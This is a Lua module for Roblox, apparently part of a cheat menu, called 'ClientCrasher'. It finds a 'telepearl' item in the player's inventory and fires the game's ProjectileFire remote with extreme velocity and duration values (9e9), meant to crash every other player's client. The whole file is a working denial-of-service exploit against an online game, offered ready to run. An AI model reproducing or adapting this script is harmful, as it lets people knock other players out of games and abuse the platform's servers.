local ClientCrasher = {}

ClientCrasher.Name = "ClientCrasher"
ClientCrasher.Enabled = false

local replicated = game:GetService("ReplicatedStorage")
local projectileRemote = {CallServerAsync = function() end}

task.spawn(function()
    projectileRemote = replicated.rbxts_include.node_modules["@rbxts"].net.out._NetManaged.ProjectileFire
end)

ClientCrasher.Run = function()
    ClientCrasher.Enabled = not ClientCrasher.Enabled

    if ClientCrasher.Enabled then
        print("✅ ClientCrasher Enabled")

        local char = game.Players.LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            local root = char.HumanoidRootPart

            -- Find telepearl
            local pearl = nil
            for _, item in replicated.Inventories[game.Players.LocalPlayer.Name]:GetChildren() do
                if item.Name:find("telepearl") then
                    pearl = item
                    break
                end
            end

            if not pearl then
                print("ClientCrasher: Missing telepearl")
                ClientCrasher.Enabled = false
                return
            end

            -- Crash
            local success = pcall(function()
                projectileRemote:CallServerAsync(
                    pearl,
                    'telepearl',
                    'telepearl',
                    root.Position,
                    root.Position,
                    Vector3.new(9e7, 9e9, 9e6),
                    '9U3ZAYNE',
                    {
                        shotId = '2XKTHZ4I',
                        drawDurationSec = 9e9
                    },
                    workspace:GetServerTimeNow()
                )
            end)

            print("ClientCrasher: " .. (success and "Crashed everyone" or "Failed to crash"))
        end

        -- Auto disable
        ClientCrasher.Enabled = false
    else
        print("❌ ClientCrasher Disabled")
    end
end

return ClientCrasher